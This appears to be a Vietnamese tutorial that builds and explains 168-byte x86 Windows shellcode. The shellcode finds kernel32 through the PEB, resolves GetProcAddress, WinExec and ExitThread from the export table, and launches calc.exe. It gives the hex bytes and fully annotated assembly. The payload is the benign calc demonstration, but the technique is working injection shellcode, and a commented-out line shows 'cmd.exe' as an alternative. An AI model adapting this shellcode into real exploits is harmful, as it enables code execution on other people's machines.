Shellcode gọi Calc.exe - 168 bytes

-------------------------------------------------------------------
COMPILE:
------------------------------------------------------------------- 
	nasm.exe shellCalc.asm -o shellCalc.obj
	python bin2hex.py shellCalc.obj
  
"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x40\x1c\x8b\x04\x08"
"\x8b\x04\x08\x8b\x58\x08\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01"
"\xda\x8b\x72\x20\x01\xde\x41\xad\x01\xd8\x81\x38\x47\x65\x74"
"\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08"
"\x64\x64\x72\x65\x75\xe2\x49\x8b\x72\x24\x01\xde\x66\x8b\x0c"
"\x4e\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd6\x31\xc9"
"\x51\x68\x45\x78\x65\x63\x68\x41\x57\x69\x6e\x89\xe1\x8d\x49"
"\x01\x51\x53\xff\xd6\x87\xfa\x89\xc7\x31\xc9\x51\x68\x72\x65"
"\x61\x64\x68\x69\x74\x54\x68\x68\x41\x41\x45\x78\x89\xe1\x8d"
"\x49\x02\x51\x53\xff\xd6\x89\xc6\x31\xc9\x51\x68\x2e\x65\x78"
"\x65\x68\x63\x61\x6c\x63\x89\xe1\x6a\x01\x51\xff\xd7\x31\xc9"
"\x51\xff\xd6"



-------------------------------------------------------------------
Các bước tạo shellcode calc:
-------------------------------------------------------------------
	Tìm Base Address của Kernel32.dll
	Tìm export table của nó
	Tìm địa chỉ hàm GetProcAddress trong kernel32.dll
	Dùng hàm GetProcAddress để tìm địa chỉ của hàm Winexec: GetProcAddress(base kernel32,"Winexec\0")
	Tìm địa chỉ của hàm ExitThread
	Dùng Winexec chạy Calc.exe
	chạy exitThread để tránh crash chương trình

-------------------------------------------------------------------
Chú giải chi tiết:
-------------------------------------------------------------------

xor ecx, ecx            
MOV EAX, [FS:ecx+0x30]  
MOV EAX, [eax+0x0C]     
MOV EAX, [EAX+0x1C]     
                        
mov eax, [eax+ecx]      
mov eax, [eax+ecx]      
                        
MOV EBX, [EAX+8]        							;EBX = BaseAddress Kernel32
 
mov edx, [ebx + 0x3c] 								;EDX = DOS->e_lfanew
add edx, ebx          								;EDX = PE Header
mov edx, [edx + 0x78] 								;EDX = Offset export table
add edx, ebx          								;EDX = Export table
mov esi, [edx + 0x20] 								
add esi, ebx          								;ESI = AddressOfNames         
 
Find_GetProc:										;tìm tên hàm GetProcAddress = cách so sánh tên của nó
	inc ecx                              
	lodsd                                
	add eax, ebx                        
	cmp dword [eax], 0x50746547         
	jnz Find_GetProc
	cmp dword [eax + 0x4], 0x41636f72   
	jnz Find_GetProc
	cmp dword [eax + 0x8], 0x65726464   
	jnz Find_GetProc
	dec ecx                             
                             
 	
	mov esi, [edx + 0x24] 							;Tìm địa chỉ của hàm GetProcAddress   
	add esi, ebx             
	mov cx, [esi + ecx * 2]                                                  
	mov esi, [edx + 0x1c]    
	add esi, ebx             
	mov edx, [esi + ecx * 4]                          
	add edx, ebx             						;EDX = GetProcAddress
 
	mov esi, edx           
 
	xor ecx,ecx
	push ecx
	push 0x63657845
	push 0x6e695741
	mov ecx,esp
	lea ecx, [ecx+1] 
	push ecx    ; Winexec\0 
	push ebx    ; Base kernel32
	  
	call esi    									;GetProcAddress(base kernel32,"Winexec\0")
 
	xchg edi,edx
	mov edi, eax
	 
	xor ecx,ecx
	push ecx
	PUSH 0x64616572
	PUSH 0x68547469
	PUSH 0x78454141
 
	mov ecx,esp
	lea ecx, [ecx+2] ; get rid of 4141(AA)  
	  
	push ecx    ; ExitThread\0  
	push ebx    ; Base kernel32
	  
	call esi    									;GetProcAddress tìm địa chỉ của ExitThread
	mov esi, eax
 
	xor ecx,ecx
	push ecx
	;push 0x20657865
	;push 0x2e646d63

	push 0x6578652e
	push 0x636c6163
	 
	mov ecx,esp 
	push 0x1    
	push ecx
	 
	call edi    									;WinExec("calc.exe \0",1)
	 
	xor ecx,ecx
	push ecx
	call esi    									;ExitThread(0)